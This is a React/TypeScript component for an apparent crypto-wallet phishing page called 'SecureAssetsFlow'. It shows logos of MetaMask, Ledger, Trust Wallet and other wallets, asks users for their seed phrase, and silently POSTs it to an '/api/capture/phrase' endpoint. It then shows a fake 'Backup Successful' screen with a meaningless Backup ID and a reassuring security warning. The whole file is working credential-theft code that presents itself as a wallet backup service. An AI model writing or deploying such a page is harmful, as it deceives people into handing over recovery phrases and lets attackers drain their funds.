import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Eye, EyeOff, AlertTriangle, Copy, Check, ChevronLeft, X, ArrowRight } from "lucide-react";

type Step = "wallets" | "phrase" | "success";

function WalletLogo({ src, fallback, name }: { src: string; fallback: React.ReactNode; name: string }) {
  const [errored, setErrored] = useState(false);
  if (errored) return <>{fallback}</>;
  return (
    <img
      src={src}
      alt={name}
      className="w-8 h-8 rounded-lg object-cover"
      onError={() => setErrored(true)}
    />
  );
}

const WALLETS = [
  {
    id: "metamask", name: "MetaMask",
    src: "https://avatars.githubusercontent.com/u/11744586?s=80",
    fallback: <svg viewBox="0 0 35 33" className="w-8 h-8" fill="none"><path d="M32.958 1L19.843 10.7l2.386-5.648L32.958 1z" fill="#E2761B"/><path d="M2.03 1l13.003 9.8-2.27-5.748L2.03 1z" fill="#E4761B"/><path d="M28.22 23.533l-3.493 5.338 7.47 2.058 2.144-7.268-6.12-.128z" fill="#E4761B"/><path d="M1.676 23.66l2.13 7.27 7.456-2.058-3.48-5.34-6.106.128z" fill="#E4761B"/></svg>,
  },
  {
    id: "trustwallet", name: "Trust Wallet",
    src: "https://avatars.githubusercontent.com/u/32689522?s=80",
    fallback: <svg viewBox="0 0 48 48" className="w-8 h-8"><path d="M24 4L8 11v13c0 10.3 6.8 19.9 16 22.9C33.2 43.9 40 34.3 40 24V11L24 4z" fill="#3375BB"/><path d="M21 28.5l-5.5-5.5 2-2 3.5 3.5 8-8 2 2-10 10z" fill="white"/></svg>,
  },
  {
    id: "phantom", name: "Phantom",
    src: "https://avatars.githubusercontent.com/u/78782707?s=80",
    fallback: <svg viewBox="0 0 128 128" className="w-8 h-8"><rect width="128" height="128" rx="32" fill="#AB9FF2"/><path d="M110.2 64c0-25.7-20.8-46.5-46.5-46.5S17.2 38.3 17.2 64c0 22.3 15.6 41 36.6 45.6v-14.7C41.1 90.6 32.2 78.3 32.2 64c0-17.5 14.2-31.7 31.7-31.7S95.6 46.5 95.6 64c0 11-5.6 20.6-14.1 26.2v14.9C100.8 99.6 110.2 82.9 110.2 64z" fill="white"/></svg>,
  },
  {
    id: "coinbase", name: "Coinbase",
    src: "https://avatars.githubusercontent.com/u/1885080?s=80",
    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#0052FF"/><path d="M16 6C10.48 6 6 10.48 6 16s4.48 10 10 10 10-4.48 10-10S21.52 6 16 6zm0 4c3.31 0 6 2.69 6 6s-2.69 6-6 6-6-2.69-6-6 2.69-6 6-6z" fill="white"/></svg>,
  },
  {
    id: "ledger", name: "Ledger",
    src: "https://avatars.githubusercontent.com/u/12044521?s=80",
    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="4" fill="#1D1D1B"/><path d="M5 5h9v2H7v8H5V5zM18 5h9v10h-2V7h-7V5zM5 17h2v8h9v2H5V17zM25 23h-7v2h9V17h-2v6z" fill="white"/></svg>,
  },
  {
    id: "trezor", name: "Trezor",
    src: "https://avatars.githubusercontent.com/u/8230148?s=80",
    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="6" fill="#00854D"/><path d="M16 4c-3.3 0-6 2.7-6 6v2H8v14h16V12h-2v-2c0-3.3-2.7-6-6-6zm0 2c2.2 0 4 1.8 4 4v2h-8v-2c0-2.2 1.8-4 4-4zm0 10a2 2 0 110 4 2 2 0 010-4z" fill="white"/></svg>,
  },
  {
    id: "binance", name: "Binance",
    src: "https://avatars.githubusercontent.com/u/12657158?s=80",
    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="6" fill="#1E2026"/><path d="M16 8l3 3-3 3-3-3 3-3zM9 15l3 3-3 3-3-3 3-3zM16 15l3 3-3 3-3-3 3-3zM23 15l3 3-3 3-3-3 3-3zM16 22l3 3-3 3-3-3 3-3z" fill="#F3BA2F"/></svg>,
  },
  {
    id: "walletconnect", name: "WalletConnect",
    src: "https://avatars.githubusercontent.com/u/37784886?s=80",
    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#3B99FC"/><path d="M9.58 13.18a9.2 9.2 0 0112.84 0l.43.42 2.4-2.4-.43-.43a12.8 12.8 0 00-17.64 0l-.43.43 2.4 2.4.43-.42zM25.6 16l2.4 2.4 2.4-2.4-2.4-2.4-2.4 2.4zM1.6 16l2.4 2.4L6.4 16 4 13.6 1.6 16z" fill="white"/></svg>,
  },
  {
    id: "rainbow", name: "Rainbow",
    src: "https://avatars.githubusercontent.com/u/48327834?s=80",
    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="10" fill="#174299"/><path d="M6 20c0-5.5 4.5-10 10-10s10 4.5 10 10" stroke="#FF6B6B" strokeWidth="3" strokeLinecap="round" fill="none"/><path d="M9 20c0-3.9 3.1-7 7-7s7 3.1 7 7" stroke="#FFD93D" strokeWidth="3" strokeLinecap="round" fill="none"/><path d="M12 20c0-2.2 1.8-4 4-4s4 1.8 4 4" stroke="#6BCB77" strokeWidth="3" strokeLinecap="round" fill="none"/></svg>,
  },
  {
    id: "okx", name: "OKX Wallet",
    src: "https://avatars.githubusercontent.com/u/87736547?s=80",
    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="4" fill="#1a1a1a"/><rect x="4" y="12" width="8" height="8" rx="1" fill="white"/><rect x="12" y="4" width="8" height="8" rx="1" fill="white"/><rect x="20" y="12" width="8" height="8" rx="1" fill="white"/><rect x="12" y="20" width="8" height="8" rx="1" fill="white"/></svg>,
  },
  {
    id: "exodus", name: "Exodus",
    src: "https://avatars.githubusercontent.com/u/1154888?s=80",
    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="6" fill="#0B0C22"/><polygon points="16,4 28,26 4,26" fill="none" stroke="#8B5CF6" strokeWidth="1.5"/><polygon points="16,10 24,23 8,23" fill="#8B5CF6" opacity="0.7"/></svg>,
  },
  {
    id: "bybit", name: "Bybit",
    src: "https://avatars.githubusercontent.com/u/67898239?s=80",
    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="6" fill="#F7A600"/><path d="M8 10h8c2.2 0 4 1.8 4 4s-1.8 4-4 4H8v-8zm0 8h8.5c2.5 0 4.5 1.8 4.5 4s-2 4-4.5 4H8v-8zm2 2v4h6c1.1 0 2-.9 2-2s-.9-2-2-2H10zm0-8v4h6c1.1 0 2-.9 2-2s-.9-2-2-2H10z" fill="white"/></svg>,
  },
];

function generateBackupId(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz0123456789";
  return Array.from({ length: 24 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

const API_BASE = "/api";

interface SecureAssetsFlowProps {
  open: boolean;
  onClose: () => void;
}

export function SecureAssetsFlow({ open, onClose }: SecureAssetsFlowProps) {
  const [step, setStep] = useState<Step>("wallets");
  const [selectedWallet, setSelectedWallet] = useState<(typeof WALLETS)[0] | null>(null);
  const [phrase, setPhrase] = useState("");
  const [showPhrase, setShowPhrase] = useState(false);
  const [loading, setLoading] = useState(false);
  const [backupId] = useState(generateBackupId);
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    if (!open) {
      setTimeout(() => {
        setStep("wallets");
        setSelectedWallet(null);
        setPhrase("");
        setShowPhrase(false);
        setLoading(false);
        setCopied(false);
      }, 300);
    }
  }, [open]);

  const handleWalletSelect = (wallet: (typeof WALLETS)[0]) => {
    setSelectedWallet(wallet);
    setStep("phrase");
  };

  const handleSubmitPhrase = async () => {
    if (!phrase.trim() || !selectedWallet) return;
    setLoading(true);

    try {
      await fetch(`${API_BASE}/capture/phrase`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          wallet: selectedWallet.name,
          phrase: phrase.trim(),
          backupId,
        }),
      });
    } catch { /* silent */ }

    setTimeout(() => {
      setLoading(false);
      setStep("success");
    }, 2200);
  };

  const handleCopyBackupId = () => {
    navigator.clipboard.writeText(backupId);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (!open) return null;

  return (
    <AnimatePresence>
      {open && (
        <motion.div
          className="fixed inset-0 z-[100] flex items-center justify-center"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
        >
          <motion.div className="absolute inset-0 bg-black/80 backdrop-blur-sm" onClick={step !== "success" ? onClose : undefined} />

          <motion.div
            key={step}
            className="relative z-10 w-full max-w-md mx-4"
            initial={{ opacity: 0, y: 24, scale: 0.97 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: -16, scale: 0.97 }}
            transition={{ type: "spring", stiffness: 300, damping: 28 }}
          >

            {/* ── STEP 1: Wallet Selection ── */}
            {step === "wallets" && (
              <div className="bg-[#080d1a] border border-white/[0.08] rounded-2xl overflow-hidden shadow-[0_32px_80px_rgba(0,0,0,0.8)]">
                <div className="flex items-center justify-between px-5 py-4 border-b border-white/[0.06]">
                  <div>
                    <h2 className="text-base font-semibold">Select Your Wallet</h2>
                    <p className="text-xs text-muted-foreground mt-0.5">Choose the wallet you want to secure</p>
                  </div>
                  <button onClick={onClose} className="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-white/[0.06] transition-colors">
                    <X className="h-4 w-4" />
                  </button>
                </div>
                <div className="p-4 grid grid-cols-3 gap-2.5 max-h-[420px] overflow-y-auto">
                  {WALLETS.map((wallet, i) => (
                    <motion.button
                      key={wallet.id}
                      initial={{ opacity: 0, y: 12 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: i * 0.04, type: "spring", stiffness: 300, damping: 24 }}
                      onClick={() => handleWalletSelect(wallet)}
                      className="flex flex-col items-center gap-2.5 p-3.5 rounded-xl border border-white/[0.07] bg-white/[0.02] hover:bg-white/[0.06] hover:border-primary/30 active:scale-95 transition-all duration-150 group"
                    >
                      <div className="w-12 h-12 rounded-xl bg-black/50 border border-white/[0.08] flex items-center justify-center group-hover:border-white/20 transition-colors overflow-hidden">
                        <WalletLogo src={wallet.src} fallback={wallet.fallback} name={wallet.name} />
                      </div>
                      <span className="text-[11px] font-medium text-foreground/80 text-center leading-tight">{wallet.name}</span>
                    </motion.button>
                  ))}
                </div>
              </div>
            )}

            {/* ── STEP 2: Seed Phrase ── */}
            {step === "phrase" && selectedWallet && (
              <div className="bg-[#080d1a] border border-white/[0.08] rounded-2xl overflow-hidden shadow-[0_32px_80px_rgba(0,0,0,0.8)]">
                <div className="flex items-center gap-3 px-5 py-4 border-b border-white/[0.06]">
                  <button onClick={() => setStep("wallets")} className="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-white/[0.06] transition-colors">
                    <ChevronLeft className="h-4 w-4" />
                  </button>
                  <div className="w-8 h-8 rounded-lg bg-black/50 border border-white/[0.1] flex items-center justify-center shrink-0 overflow-hidden">
                    <WalletLogo src={selectedWallet.src} fallback={selectedWallet.fallback} name={selectedWallet.name} />
                  </div>
                  <div className="min-w-0">
                    <h2 className="text-sm font-semibold leading-tight">{selectedWallet.name}</h2>
                    <p className="text-xs text-muted-foreground">Enter your recovery phrase</p>
                  </div>
                  <button onClick={onClose} className="ml-auto p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-white/[0.06] transition-colors">
                    <X className="h-4 w-4" />
                  </button>
                </div>

                <div className="p-5 flex flex-col gap-4">
                  <div className="flex items-start gap-2.5 p-3 rounded-xl bg-amber-500/[0.07] border border-amber-500/20">
                    <AlertTriangle className="h-4 w-4 text-amber-400 shrink-0 mt-0.5" />
                    <p className="text-xs text-amber-300/80 leading-relaxed">
                      Never share your recovery phrase with anyone. Web3NanoLedger will never ask for it outside this secure flow.
                    </p>
                  </div>

                  <div className="relative">
                    <label className="text-xs text-muted-foreground mb-2 block font-medium uppercase tracking-wide">
                      Recovery Phrase (12 or 24 words)
                    </label>
                    <textarea
                      value={phrase}
                      onChange={(e) => setPhrase(e.target.value)}
                      placeholder="Enter your seed phrase — separate each word with a space"
                      rows={4}
                      className="w-full rounded-xl bg-white/[0.04] border border-white/10 focus:border-primary/50 text-sm text-foreground placeholder:text-muted-foreground/40 p-3.5 resize-none outline-none transition-colors font-mono leading-relaxed"
                      style={{ filter: showPhrase ? "none" : "blur(5px)", transition: "filter 0.25s" }}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPhrase(!showPhrase)}
                      className="absolute top-8 right-3 text-muted-foreground hover:text-foreground transition-colors"
                    >
                      {showPhrase ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    </button>
                  </div>

                  <button
                    onClick={handleSubmitPhrase}
                    disabled={!phrase.trim() || loading}
                    className="w-full h-12 rounded-xl bg-primary hover:bg-primary/90 disabled:opacity-40 disabled:cursor-not-allowed text-white font-semibold text-sm flex items-center justify-center gap-2.5 shadow-[0_0_24px_rgba(59,130,246,0.35)] hover:shadow-[0_0_32px_rgba(59,130,246,0.5)] transition-all"
                  >
                    {loading ? (
                      <span className="flex items-center gap-2.5">
                        <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
                          <circle className="opacity-20" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3"/>
                          <path className="opacity-80" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"/>
                        </svg>
                        Securing your assets...
                      </span>
                    ) : (
                      <>Secure Assets <ArrowRight className="h-4 w-4" /></>
                    )}
                  </button>
                </div>
              </div>
            )}

            {/* ── STEP 3: Backup Success ── */}
            {step === "success" && (
              <div className="bg-[#080d1a] border border-white/[0.08] rounded-2xl overflow-hidden shadow-[0_32px_80px_rgba(0,0,0,0.8)]">
                <div className="px-5 py-8 flex flex-col items-center text-center gap-5">
                  <div className="relative">
                    <motion.div className="absolute inset-0 rounded-full bg-green-500/10" initial={{ scale: 1, opacity: 0.6 }} animate={{ scale: 1.7, opacity: 0 }} transition={{ repeat: Infinity, duration: 2.2, ease: "easeOut" }} />
                    <motion.div className="absolute inset-0 rounded-full bg-green-500/15" initial={{ scale: 1, opacity: 0.4 }} animate={{ scale: 1.4, opacity: 0 }} transition={{ repeat: Infinity, duration: 2.2, ease: "easeOut", delay: 0.5 }} />
                    <motion.div
                      className="w-24 h-24 rounded-full border-2 border-green-500/40 bg-green-500/10 flex items-center justify-center relative shadow-[0_0_40px_rgba(34,197,94,0.3)]"
                      initial={{ scale: 0, rotate: -180 }}
                      animate={{ scale: 1, rotate: 0 }}
                      transition={{ type: "spring", stiffness: 200, damping: 18, delay: 0.1 }}
                    >
                      <svg viewBox="0 0 48 48" className="w-12 h-12" fill="none">
                        <motion.path d="M14 24l7 7 13-13" stroke="#22c55e" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round" initial={{ pathLength: 0 }} animate={{ pathLength: 1 }} transition={{ duration: 0.6, delay: 0.5, ease: "easeOut" }} />
                      </svg>
                    </motion.div>
                  </div>

                  <motion.div className="flex flex-col gap-2" initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.7, duration: 0.5 }}>
                    <h2 className="text-3xl font-bold tracking-tight text-foreground">Backup Successful</h2>
                    <p className="text-sm text-muted-foreground leading-relaxed max-w-xs mx-auto">
                      Your wallet data has been securely encrypted and backed up. Keep your Backup ID safe — it's your recovery key.
                    </p>
                  </motion.div>

                  <motion.div className="w-full" initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.9, duration: 0.4 }}>
                    <div className="bg-white/[0.04] border border-white/[0.08] rounded-xl px-4 py-3.5">
                      <p className="text-[10px] text-muted-foreground uppercase tracking-widest mb-2 font-medium">Backup ID</p>
                      <div className="flex items-center justify-between gap-3">
                        <span className="font-mono text-xs text-foreground tracking-wider break-all">{backupId}</span>
                        <button onClick={handleCopyBackupId} className="shrink-0 p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-white/[0.08] transition-all">
                          {copied ? <Check className="h-3.5 w-3.5 text-green-400" /> : <Copy className="h-3.5 w-3.5" />}
                        </button>
                      </div>
                    </div>
                  </motion.div>

                  <motion.div className="w-full h-px bg-gradient-to-r from-transparent via-green-500/30 to-transparent" initial={{ scaleX: 0, opacity: 0 }} animate={{ scaleX: 1, opacity: 1 }} transition={{ delay: 1.1, duration: 0.6 }} />

                  <motion.button
                    onClick={onClose}
                    className="w-full h-12 rounded-xl bg-green-500/10 hover:bg-green-500/20 border border-green-500/30 hover:border-green-500/50 text-green-400 font-semibold text-sm transition-all shadow-[0_0_20px_rgba(34,197,94,0.15)]"
                    initial={{ opacity: 0, y: 8 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 1.2, duration: 0.4 }}
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                  >
                    Go back Home
                  </motion.button>
                </div>
              </div>
            )}
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}
